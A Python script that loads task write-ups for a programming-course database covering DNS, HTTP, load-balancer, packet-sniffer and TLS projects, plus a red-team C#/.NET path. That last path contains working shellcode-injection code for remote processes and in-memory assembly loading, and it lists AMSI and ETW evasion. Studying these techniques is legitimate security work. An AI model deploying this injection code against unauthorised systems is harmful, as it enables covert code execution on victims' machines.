#!/usr/bin/env python3
"""Fix remaining paths with generic template tasks - Part 2."""

import sqlite3

DB_PATH = "data/quest-log.db"

SPECIFIC_DETAILS = {
    # ============== Build Your Own DNS Server ==============
    ("Build Your Own DNS Server", "Research the domain"): """## DNS Protocol Research

### DNS Fundamentals
```
DNS Message Format:
┌──────────────────────────────────────────┐
│ Header (12 bytes)                        │
│  - ID, Flags, Question/Answer counts     │
├──────────────────────────────────────────┤
│ Question Section                         │
│  - QNAME (domain), QTYPE, QCLASS        │
├──────────────────────────────────────────┤
│ Answer Section                           │
│  - Resource Records (RRs)                │
├──────────────────────────────────────────┤
│ Authority Section                        │
├──────────────────────────────────────────┤
│ Additional Section                       │
└──────────────────────────────────────────┘

Record Types:
- A (1): IPv4 address
- AAAA (28): IPv6 address
- CNAME (5): Canonical name (alias)
- MX (15): Mail exchange
- NS (2): Name server
- TXT (16): Text record
- SOA (6): Start of authority
```

### Key RFCs
- RFC 1034: Domain Names - Concepts and Facilities
- RFC 1035: Domain Names - Implementation and Specification
- RFC 2181: Clarifications to the DNS Specification

### Completion Criteria
- [ ] Understand DNS message format
- [ ] Learn record types and their purposes
- [ ] Study recursive vs iterative resolution
- [ ] Understand zone files and SOA records""",

    ("Build Your Own DNS Server", "Design architecture"): """## DNS Server Architecture

### Component Design
```
┌─────────────────────────────────────────────────────────┐
│                    DNS Server                            │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │              UDP/TCP Listener                    │   │
│  │  - Port 53 UDP (primary)                        │   │
│  │  - Port 53 TCP (large responses, zone transfer) │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │              Query Handler                       │   │
│  │  - Parse DNS message                            │   │
│  │  - Route to appropriate resolver                │   │
│  └──────────────────────┬──────────────────────────┘   │
│           ┌─────────────┴─────────────┐                │
│  ┌────────┴────────┐      ┌───────────┴───────────┐   │
│  │  Zone Manager   │      │   Recursive Resolver  │   │
│  │  - Load zones   │      │   - Query upstream    │   │
│  │  - Local lookup │      │   - Cache responses   │   │
│  └─────────────────┘      └───────────────────────┘   │
│                                    │                    │
│  ┌─────────────────────────────────┴───────────────┐   │
│  │                    Cache                         │   │
│  │  - TTL-based expiration                         │   │
│  │  - Negative caching                             │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### Completion Criteria
- [ ] Design message parser/builder
- [ ] Plan zone file loader
- [ ] Design caching layer with TTL
- [ ] Plan recursive resolution flow""",

    ("Build Your Own DNS Server", "Set up project structure"): """## DNS Server Project Structure

### Directory Layout
```
dns-server/
├── cmd/
│   └── dnsd/
│       └── main.go              # Server entry point
├── pkg/
│   ├── dns/
│   │   ├── message.go           # DNS message parsing/building
│   │   ├── header.go            # DNS header handling
│   │   ├── question.go          # Question section
│   │   ├── record.go            # Resource record types
│   │   └── name.go              # Domain name encoding
│   ├── server/
│   │   ├── server.go            # UDP/TCP server
│   │   └── handler.go           # Query handler
│   ├── zone/
│   │   ├── zone.go              # Zone management
│   │   ├── parser.go            # Zone file parser
│   │   └── storage.go           # Zone storage
│   ├── resolver/
│   │   ├── resolver.go          # Recursive resolver
│   │   └── cache.go             # Response caching
│   └── config/
│       └── config.go            # Server configuration
├── zones/
│   └── example.com.zone         # Sample zone file
└── go.mod
```

### Completion Criteria
- [ ] Set up Go module structure
- [ ] Create DNS message package
- [ ] Implement zone file parser
- [ ] Add configuration management""",

    ("Build Your Own DNS Server", "Implement core logic"): """## DNS Server Core Implementation

### DNS Message Parser
```go
package dns

import (
    "encoding/binary"
    "errors"
)

type Header struct {
    ID      uint16
    Flags   uint16
    QDCount uint16  // Questions
    ANCount uint16  // Answers
    NSCount uint16  // Authority
    ARCount uint16  // Additional
}

type Question struct {
    Name  string
    Type  uint16
    Class uint16
}

type ResourceRecord struct {
    Name     string
    Type     uint16
    Class    uint16
    TTL      uint32
    RDLength uint16
    RData    []byte
}

type Message struct {
    Header     Header
    Questions  []Question
    Answers    []ResourceRecord
    Authority  []ResourceRecord
    Additional []ResourceRecord
}

func ParseMessage(data []byte) (*Message, error) {
    if len(data) < 12 {
        return nil, errors.New("message too short")
    }

    msg := &Message{}

    // Parse header
    msg.Header.ID = binary.BigEndian.Uint16(data[0:2])
    msg.Header.Flags = binary.BigEndian.Uint16(data[2:4])
    msg.Header.QDCount = binary.BigEndian.Uint16(data[4:6])
    msg.Header.ANCount = binary.BigEndian.Uint16(data[6:8])
    msg.Header.NSCount = binary.BigEndian.Uint16(data[8:10])
    msg.Header.ARCount = binary.BigEndian.Uint16(data[10:12])

    offset := 12

    // Parse questions
    for i := 0; i < int(msg.Header.QDCount); i++ {
        q, n := parseQuestion(data, offset)
        msg.Questions = append(msg.Questions, q)
        offset += n
    }

    return msg, nil
}

func parseQuestion(data []byte, offset int) (Question, int) {
    name, n := decodeName(data, offset)
    q := Question{
        Name:  name,
        Type:  binary.BigEndian.Uint16(data[offset+n : offset+n+2]),
        Class: binary.BigEndian.Uint16(data[offset+n+2 : offset+n+4]),
    }
    return q, n + 4
}

// Decode DNS name with compression support
func decodeName(data []byte, offset int) (string, int) {
    var name string
    start := offset

    for {
        length := int(data[offset])
        if length == 0 {
            offset++
            break
        }
        // Handle compression pointer
        if length&0xC0 == 0xC0 {
            pointer := int(binary.BigEndian.Uint16(data[offset:offset+2])) & 0x3FFF
            suffix, _ := decodeName(data, pointer)
            name += suffix
            offset += 2
            break
        }
        offset++
        name += string(data[offset:offset+length]) + "."
        offset += length
    }

    return name, offset - start
}
```

### Completion Criteria
- [ ] Implement message parsing
- [ ] Implement name encoding/decoding with compression
- [ ] Build resource record handlers
- [ ] Implement message serialization""",

    # ============== Build Your Own HTTP Server ==============
    ("Build Your Own HTTP Server", "Research the domain"): """## HTTP Protocol Research

### HTTP/1.1 Fundamentals
```
Request Format:
METHOD /path HTTP/1.1\\r\\n
Header-Name: Header-Value\\r\\n
...\\r\\n
\\r\\n
[Body]

Response Format:
HTTP/1.1 STATUS Reason\\r\\n
Header-Name: Header-Value\\r\\n
...\\r\\n
\\r\\n
[Body]

Key Headers:
- Host: Required in HTTP/1.1
- Content-Length: Body size
- Content-Type: MIME type
- Transfer-Encoding: chunked
- Connection: keep-alive/close
```

### Key Concepts
```
- Request routing and method handling
- Keep-alive connections and timeouts
- Chunked transfer encoding
- Static file serving with MIME types
- URL parsing and query strings
- Cookie handling
```

### RFCs
- RFC 7230-7235: HTTP/1.1 specification
- RFC 9110: HTTP Semantics

### Completion Criteria
- [ ] Understand HTTP message format
- [ ] Learn about persistent connections
- [ ] Study chunked encoding
- [ ] Understand content negotiation""",

    ("Build Your Own HTTP Server", "Design architecture"): """## HTTP Server Architecture

### Component Design
```
┌─────────────────────────────────────────────────────────┐
│                    HTTP Server                           │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │              TCP Listener                        │   │
│  │  - Accept connections                           │   │
│  │  - Spawn connection handlers                    │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │           Connection Handler                     │   │
│  │  - Parse HTTP request                           │   │
│  │  - Keep-alive management                        │   │
│  │  - Timeout handling                             │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │              Router                              │   │
│  │  - Match URL to handler                         │   │
│  │  - Extract path parameters                      │   │
│  │  - Method filtering                             │   │
│  └──────────────────────┬──────────────────────────┘   │
│           ┌─────────────┴─────────────┐                │
│  ┌────────┴────────┐      ┌───────────┴───────────┐   │
│  │ Static Handler  │      │   Dynamic Handlers    │   │
│  │ - File serving  │      │   - User routes       │   │
│  │ - MIME types    │      │   - Middleware        │   │
│  └─────────────────┘      └───────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### Completion Criteria
- [ ] Design request/response types
- [ ] Plan routing system
- [ ] Design middleware pipeline
- [ ] Plan static file handler""",

    ("Build Your Own HTTP Server", "Implement core logic"): """## HTTP Server Core Implementation

### Request Parser
```go
package http

import (
    "bufio"
    "fmt"
    "net"
    "strconv"
    "strings"
)

type Request struct {
    Method  string
    Path    string
    Version string
    Headers map[string]string
    Body    []byte
}

type Response struct {
    StatusCode int
    StatusText string
    Headers    map[string]string
    Body       []byte
}

func ParseRequest(conn net.Conn) (*Request, error) {
    reader := bufio.NewReader(conn)

    // Read request line
    line, _ := reader.ReadString('\\n')
    parts := strings.Fields(line)
    if len(parts) != 3 {
        return nil, fmt.Errorf("invalid request line")
    }

    req := &Request{
        Method:  parts[0],
        Path:    parts[1],
        Version: parts[2],
        Headers: make(map[string]string),
    }

    // Read headers
    for {
        line, _ := reader.ReadString('\\n')
        line = strings.TrimSpace(line)
        if line == "" {
            break
        }
        parts := strings.SplitN(line, ":", 2)
        if len(parts) == 2 {
            req.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
        }
    }

    // Read body if Content-Length present
    if lenStr, ok := req.Headers["Content-Length"]; ok {
        length, _ := strconv.Atoi(lenStr)
        req.Body = make([]byte, length)
        reader.Read(req.Body)
    }

    return req, nil
}

func (r *Response) Write(conn net.Conn) error {
    // Status line
    fmt.Fprintf(conn, "HTTP/1.1 %d %s\\r\\n", r.StatusCode, r.StatusText)

    // Headers
    for k, v := range r.Headers {
        fmt.Fprintf(conn, "%s: %s\\r\\n", k, v)
    }

    // Content-Length if body present
    if len(r.Body) > 0 {
        fmt.Fprintf(conn, "Content-Length: %d\\r\\n", len(r.Body))
    }

    fmt.Fprint(conn, "\\r\\n")

    // Body
    conn.Write(r.Body)
    return nil
}
```

### Completion Criteria
- [ ] Implement request parsing
- [ ] Implement response writing
- [ ] Handle chunked encoding
- [ ] Support keep-alive connections""",

    # ============== Build Your Own Load Balancer ==============
    ("Build Your Own Load Balancer", "Research the domain"): """## Load Balancer Research

### Load Balancing Fundamentals
```
Algorithms:
- Round Robin: Rotate through servers sequentially
- Weighted Round Robin: Servers get traffic proportional to weight
- Least Connections: Route to server with fewest active connections
- IP Hash: Consistent routing based on client IP
- Random: Simple random selection
- Least Response Time: Route to fastest responding server

Health Checking:
- TCP connect check
- HTTP health endpoint
- Custom health scripts
- Passive health monitoring (error rates)

Types:
- L4 (Transport): TCP/UDP level, fast, limited routing options
- L7 (Application): HTTP level, can route based on URL/headers
```

### Key Concepts
```
- Sticky sessions (session persistence)
- Connection draining
- Blue-green deployments
- Circuit breaker pattern
- Rate limiting
```

### Completion Criteria
- [ ] Understand load balancing algorithms
- [ ] Study health check patterns
- [ ] Learn about session persistence
- [ ] Understand L4 vs L7 load balancing""",

    ("Build Your Own Load Balancer", "Implement core logic"): """## Load Balancer Core Implementation

### Round Robin with Health Checks
```go
package lb

import (
    "net"
    "net/http"
    "sync"
    "sync/atomic"
    "time"
)

type Backend struct {
    URL     string
    Healthy bool
    Weight  int
    Conns   int32
}

type LoadBalancer struct {
    backends []*Backend
    current  uint32
    mu       sync.RWMutex
}

func NewLoadBalancer(urls []string) *LoadBalancer {
    lb := &LoadBalancer{}
    for _, url := range urls {
        lb.backends = append(lb.backends, &Backend{URL: url, Healthy: true, Weight: 1})
    }
    go lb.healthCheck()
    return lb
}

// Round Robin
func (lb *LoadBalancer) NextRoundRobin() *Backend {
    lb.mu.RLock()
    defer lb.mu.RUnlock()

    for i := 0; i < len(lb.backends); i++ {
        idx := atomic.AddUint32(&lb.current, 1) % uint32(len(lb.backends))
        if lb.backends[idx].Healthy {
            return lb.backends[idx]
        }
    }
    return nil
}

// Least Connections
func (lb *LoadBalancer) NextLeastConn() *Backend {
    lb.mu.RLock()
    defer lb.mu.RUnlock()

    var best *Backend
    for _, b := range lb.backends {
        if !b.Healthy {
            continue
        }
        if best == nil || atomic.LoadInt32(&b.Conns) < atomic.LoadInt32(&best.Conns) {
            best = b
        }
    }
    return best
}

// Health Check
func (lb *LoadBalancer) healthCheck() {
    ticker := time.NewTicker(5 * time.Second)
    for range ticker.C {
        for _, b := range lb.backends {
            go func(backend *Backend) {
                conn, err := net.DialTimeout("tcp", backend.URL, 2*time.Second)
                lb.mu.Lock()
                backend.Healthy = err == nil
                lb.mu.Unlock()
                if conn != nil {
                    conn.Close()
                }
            }(b)
        }
    }
}

// Proxy handler
func (lb *LoadBalancer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    backend := lb.NextLeastConn()
    if backend == nil {
        http.Error(w, "No healthy backends", 503)
        return
    }

    atomic.AddInt32(&backend.Conns, 1)
    defer atomic.AddInt32(&backend.Conns, -1)

    // Proxy request to backend...
}
```

### Completion Criteria
- [ ] Implement multiple algorithms
- [ ] Add health checking
- [ ] Track connection counts
- [ ] Handle backend failures gracefully""",

    # ============== Build Your Own Packet Sniffer ==============
    ("Build Your Own Packet Sniffer", "Research the domain"): """## Packet Capture Research

### Fundamentals
```
Capture Methods:
- Raw sockets: Direct access to network frames
- libpcap/WinPcap: Portable packet capture library
- BPF (Berkeley Packet Filter): Kernel-level filtering
- AF_PACKET (Linux): Socket family for raw packets

Packet Structure:
┌─────────────────────────────────────┐
│ Ethernet Header (14 bytes)          │
│  - Dest MAC, Src MAC, EtherType     │
├─────────────────────────────────────┤
│ IP Header (20+ bytes)               │
│  - Version, IHL, TOS, Length        │
│  - ID, Flags, Fragment Offset       │
│  - TTL, Protocol, Checksum          │
│  - Source IP, Dest IP               │
├─────────────────────────────────────┤
│ TCP/UDP Header                      │
├─────────────────────────────────────┤
│ Payload                             │
└─────────────────────────────────────┘
```

### Key Concepts
```
- Promiscuous mode for all traffic
- BPF filter syntax (tcpdump-style)
- Packet dissection and protocol parsing
- PCAP file format for storage
```

### Completion Criteria
- [ ] Understand raw socket programming
- [ ] Learn packet header structures
- [ ] Study BPF filter syntax
- [ ] Understand PCAP file format""",

    ("Build Your Own Packet Sniffer", "Implement core logic"): """## Packet Sniffer Implementation

### Raw Socket Capture
```python
import socket
import struct
from dataclasses import dataclass

@dataclass
class EthernetHeader:
    dest_mac: str
    src_mac: str
    ethertype: int

@dataclass
class IPHeader:
    version: int
    ihl: int
    ttl: int
    protocol: int
    src_ip: str
    dst_ip: str

@dataclass
class TCPHeader:
    src_port: int
    dst_port: int
    seq: int
    ack: int
    flags: int

def mac_to_str(mac_bytes):
    return ':'.join(f'{b:02x}' for b in mac_bytes)

def ip_to_str(ip_bytes):
    return '.'.join(str(b) for b in ip_bytes)

def parse_ethernet(data):
    dest, src, ethertype = struct.unpack('!6s6sH', data[:14])
    return EthernetHeader(mac_to_str(dest), mac_to_str(src), ethertype), data[14:]

def parse_ip(data):
    version_ihl = data[0]
    version = version_ihl >> 4
    ihl = (version_ihl & 0xF) * 4
    ttl = data[8]
    protocol = data[9]
    src_ip = ip_to_str(data[12:16])
    dst_ip = ip_to_str(data[16:20])
    return IPHeader(version, ihl, ttl, protocol, src_ip, dst_ip), data[ihl:]

def parse_tcp(data):
    src_port, dst_port, seq, ack, offset_flags = struct.unpack('!HHIIH', data[:14])
    offset = (offset_flags >> 12) * 4
    flags = offset_flags & 0x3F
    return TCPHeader(src_port, dst_port, seq, ack, flags), data[offset:]

def capture():
    # Create raw socket (requires root)
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

    while True:
        data, addr = sock.recvfrom(65535)

        eth, remaining = parse_ethernet(data)
        if eth.ethertype != 0x0800:  # IPv4
            continue

        ip, remaining = parse_ip(remaining)
        if ip.protocol != 6:  # TCP
            continue

        tcp, payload = parse_tcp(remaining)

        print(f"{ip.src_ip}:{tcp.src_port} -> {ip.dst_ip}:{tcp.dst_port}")
        print(f"  Flags: SYN={tcp.flags&0x02>0} ACK={tcp.flags&0x10>0}")
        if payload:
            print(f"  Payload: {payload[:50]}...")

if __name__ == "__main__":
    capture()
```

### Completion Criteria
- [ ] Implement raw socket capture
- [ ] Parse Ethernet, IP, TCP headers
- [ ] Add BPF-style filtering
- [ ] Implement PCAP file writing""",

    # ============== Build Your Own TLS ==============
    ("Build Your Own TLS", "Research the domain"): """## TLS Protocol Research

### TLS 1.2/1.3 Fundamentals
```
TLS 1.2 Handshake:
Client                              Server
  |--- ClientHello ------------------->|
  |<-- ServerHello --------------------|
  |<-- Certificate --------------------|
  |<-- ServerKeyExchange --------------|
  |<-- ServerHelloDone ----------------|
  |--- ClientKeyExchange ------------->|
  |--- ChangeCipherSpec -------------->|
  |--- Finished ---------------------->|
  |<-- ChangeCipherSpec ---------------|
  |<-- Finished -----------------------|
  |<===== Application Data ===========|

TLS 1.3 (Simplified):
Client                              Server
  |--- ClientHello + KeyShare -------->|
  |<-- ServerHello + KeyShare ---------|
  |<-- EncryptedExtensions ------------|
  |<-- Certificate --------------------|
  |<-- Finished -----------------------|
  |--- Finished ---------------------->|
```

### Key Concepts
```
- Cipher suites (key exchange, auth, encryption, MAC)
- X.509 certificates and chain validation
- Key derivation (PRF, HKDF)
- Record layer framing
- AEAD encryption (AES-GCM, ChaCha20-Poly1305)
```

### Completion Criteria
- [ ] Understand TLS handshake flow
- [ ] Learn certificate validation
- [ ] Study key exchange algorithms
- [ ] Understand record layer encryption""",

    ("Build Your Own TLS", "Implement core logic"): """## TLS Implementation

### Handshake Message Parsing
```python
import struct
import hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes

class TLSRecord:
    HANDSHAKE = 22
    APPLICATION_DATA = 23
    ALERT = 21

    def __init__(self, content_type, version, data):
        self.content_type = content_type
        self.version = version
        self.data = data

    @classmethod
    def parse(cls, data):
        content_type = data[0]
        version = struct.unpack('!H', data[1:3])[0]
        length = struct.unpack('!H', data[3:5])[0]
        return cls(content_type, version, data[5:5+length])

    def serialize(self):
        return struct.pack('!BHH', self.content_type, self.version, len(self.data)) + self.data

class ClientHello:
    def __init__(self, random, session_id, cipher_suites, extensions):
        self.random = random  # 32 bytes
        self.session_id = session_id
        self.cipher_suites = cipher_suites
        self.extensions = extensions

    def serialize(self):
        data = b''
        data += struct.pack('!H', 0x0303)  # TLS 1.2
        data += self.random
        data += struct.pack('B', len(self.session_id)) + self.session_id
        data += struct.pack('!H', len(self.cipher_suites) * 2)
        for cs in self.cipher_suites:
            data += struct.pack('!H', cs)
        data += b'\\x01\\x00'  # Compression: null
        # Extensions...
        return struct.pack('!BL', 1, len(data))[1:] + data  # Handshake type 1

class KeyExchange:
    def __init__(self):
        self.private_key = ec.generate_private_key(ec.SECP256R1())
        self.public_key = self.private_key.public_key()

    def derive_shared_secret(self, peer_public_bytes):
        peer_public = ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(), peer_public_bytes
        )
        return self.private_key.exchange(ec.ECDH(), peer_public)

def derive_keys(shared_secret, client_random, server_random):
    # TLS 1.2 PRF using SHA-256
    seed = b"master secret" + client_random + server_random
    # P_SHA256 expansion...
    pass
```

### Completion Criteria
- [ ] Implement record layer parsing
- [ ] Build ClientHello/ServerHello
- [ ] Implement ECDHE key exchange
- [ ] Add AES-GCM encryption""",

    # ============== Red Team Tooling: C# & .NET ==============
    ("Red Team Tooling: C# & .NET", "Research the domain"): """## C#/.NET for Red Team Research

### .NET Security Landscape
```
Key APIs for Offensive Tools:
- P/Invoke: Call native Windows APIs
- System.Reflection: Load/invoke assemblies dynamically
- System.Net: Network operations
- System.Security: Crypto, permissions
- System.Management: WMI access

Evasion Considerations:
- AMSI (Antimalware Scan Interface)
- CLR ETW (Event Tracing)
- .NET assembly metadata
- Managed vs unmanaged code
```

### Important Techniques
```
- In-memory assembly loading
- P/Invoke for Windows API
- D/Invoke for direct syscalls
- Reflection for obfuscation
- AppDomain isolation
```

### Tools to Study
```
- SharpCollection (aggregated tools)
- Rubeus (Kerberos)
- Seatbelt (enumeration)
- SharpHound (BloodHound collector)
```

### Completion Criteria
- [ ] Understand .NET runtime security
- [ ] Learn P/Invoke for Win32 API
- [ ] Study AMSI bypass techniques
- [ ] Learn in-memory assembly loading""",

    ("Red Team Tooling: C# & .NET", "Design architecture"): """## C# Red Team Tool Architecture

### Modular Tool Design
```
┌─────────────────────────────────────────────────────────┐
│                  Red Team Framework                      │
├─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │              Evasion Layer                       │   │
│  │  - AMSI bypass                                  │   │
│  │  - ETW patching                                 │   │
│  │  - String obfuscation                           │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │              Native Interface                    │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────────────┐ │   │
│  │  │ P/Invoke│  │ D/Invoke│  │  Direct Syscall │ │   │
│  │  └─────────┘  └─────────┘  └─────────────────┘ │   │
│  └──────────────────────┬──────────────────────────┘   │
│                         │                               │
│  ┌──────────────────────┴──────────────────────────┐   │
│  │              Modules                             │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────────────┐ │   │
│  │  │ Creds   │  │ Recon   │  │   Persistence   │ │   │
│  │  │ Dumper  │  │ Module  │  │     Module      │ │   │
│  │  └─────────┘  └─────────┘  └─────────────────┘ │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### Completion Criteria
- [ ] Design modular architecture
- [ ] Plan evasion layer interface
- [ ] Abstract native API calls
- [ ] Design plugin system for modules""",

    ("Red Team Tooling: C# & .NET", "Implement core logic"): """## C# Red Team Implementation

### P/Invoke and Memory Operations
```csharp
using System;
using System.Runtime.InteropServices;

public class NativeMethods
{
    // P/Invoke declarations
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr address,
        uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr address,
        byte[] buffer, uint size, out uint written);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attr,
        uint stackSize, IntPtr startAddress, IntPtr param, uint flags, out uint threadId);

    // Constants
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}

public class MemoryOperations
{
    public static bool InjectShellcode(int pid, byte[] shellcode)
    {
        IntPtr hProcess = NativeMethods.OpenProcess(
            NativeMethods.PROCESS_ALL_ACCESS, false, pid);

        if (hProcess == IntPtr.Zero)
            return false;

        IntPtr allocAddr = NativeMethods.VirtualAllocEx(
            hProcess, IntPtr.Zero, (uint)shellcode.Length,
            NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
            NativeMethods.PAGE_EXECUTE_READWRITE);

        uint written;
        NativeMethods.WriteProcessMemory(hProcess, allocAddr, shellcode,
            (uint)shellcode.Length, out written);

        uint threadId;
        NativeMethods.CreateRemoteThread(hProcess, IntPtr.Zero, 0,
            allocAddr, IntPtr.Zero, 0, out threadId);

        return true;
    }
}

// In-memory assembly loading
public class AssemblyLoader
{
    public static void LoadAndExecute(byte[] assemblyBytes, string[] args)
    {
        var assembly = System.Reflection.Assembly.Load(assemblyBytes);
        var entryPoint = assembly.EntryPoint;
        entryPoint.Invoke(null, new object[] { args });
    }
}
```

### Completion Criteria
- [ ] Implement P/Invoke wrappers
- [ ] Build memory manipulation helpers
- [ ] Add assembly loading utilities
- [ ] Implement basic evasion techniques""",
}

def update_tasks():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    updated = 0
    for (path_name, task_title), details in SPECIFIC_DETAILS.items():
        cursor.execute("""
            UPDATE tasks SET details = ?
            WHERE id IN (
                SELECT t.id FROM tasks t
                JOIN modules m ON t.module_id = m.id
                JOIN paths p ON m.path_id = p.id
                WHERE p.name = ? AND t.title = ?
            )
        """, (details, path_name, task_title))

        if cursor.rowcount > 0:
            updated += cursor.rowcount
            print(f"Updated: {path_name} / {task_title}")

    conn.commit()
    conn.close()
    print(f"\nDone! Updated {updated} tasks.")

if __name__ == "__main__":
    update_tasks()
